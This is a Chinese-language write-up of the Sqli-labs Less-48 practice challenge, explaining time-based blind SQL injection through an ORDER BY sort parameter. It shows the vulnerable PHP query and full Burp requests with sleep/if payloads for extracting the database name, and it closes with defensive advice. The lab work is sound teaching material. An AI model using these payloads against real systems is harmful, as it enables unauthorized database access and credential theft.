## 题目: Sqli‑labs Less‑48

## 题目描述
GET传入sort排序参数，数字型ORDER BY注入，关闭SQL报错回显，报错注入失效。ORDER BY位置布尔条件判断失效，页面行数不会随真假条件变化，只能使用时间盲注。直接使用`sleep()`会对每一行执行造成超时，需要用`(select sleep(N) from users limit 1)`限制只执行一次延时。

## 核心原理
```php
$id = $_GET['sort'];
$sql = "SELECT * FROM users ORDER BY $id";
```
关键点：数字型无需引号；无报错输出，updatexml 报错注入无法使用；`and 1=1 / and 1=2`页面无差异，布尔盲注不可用；直接 sleep 会遍历全部数据行导致超大延时，使用子查询`limit 1`限制 sleep 仅执行一次；通过`if()`构造条件延时预言机，依靠响应时间判断条件真假。
**解题思路**
1. Burp 抓包修改 sort 参数，验证 sleep 延时是否生效；
2. 使用`if(条件,(select sleep(1) from users limit 1),1)`构造时间盲注 payload；
3. 二分法逐字符猜解库、表、字段数据；


## 解题步骤
### 1. 验证 sleep 延时 Burp 包
```
GET /sqli-labs/Less-48/?sort=(select sleep(2) from users limit 1) HTTP/1.1
Host: 127.0.0.1
```
观察 Repeater 右下角 Elapsed 耗时，请求发生明显延迟，证明 sleep 函数可执行。

### 2. 条件延时测试 Burp 包（条件为真才延时）
```
GET /sqli-labs/Less-48/?sort=if((select ascii(substr(database(),1,1)) from dual)>100,(select sleep(2) from users limit 1),1) HTTP/1.1
Host: 127.0.0.1
```
- 条件成立：请求延时约 2 秒
- 条件不成立：请求快速返回

### 3. 猜库名 payload 示例 Burp 包
```
GET /sqli-labs/Less-48/?sort=if((select ascii(substr(database(),1,1)) from dual)>110,(select sleep(2) from users limit 1),1) HTTP/1.1
Host: 127.0.0.1
```
> 
> 修改 substr 偏移、ascii 对比数值，结合二分法逐位猜字符；后续替换子查询可爆表、字段、账号密码。

## 踩坑记录
1. 禁止直接写`sort=1 and sleep(2)`，ORDER BY 会对每一行执行 sleep，多行会造成请求严重超时；必须加上子查询`limit 1`限制仅执行一次延时。
2. 关闭报错输出，updatexml 等报错注入完全无效。
3. ORDER BY 下布尔条件不会改变页面返回行数，布尔盲注无法使用。
4. 网络抖动会造成时间误判，sleep 不要设置过小，预留判定阈值。
5. 脚本猜解注意二分边界，ASCII 取值 32‑126 可见字符范围。

## 知识点总结
- ORDER BY 时间盲注：无报错、无页面差异场景，依靠响应延时判断条件真假。
- sleep 优化技巧：`(select sleep(N) from users limit 1)`避免逐行计算带来超长延时。
- 时间盲注要素：记录基线耗时、设置 sleep 阈值、二分法减少请求数量。
- 关卡对比：Less‑46/47 有报错回显优先报错注入；Less‑48 关闭报错只能使用时间盲注。
- 防御：sort 参数使用列名白名单；禁止直接拼接用户输入；关闭数据库报错输出；最小权限数据库账号。
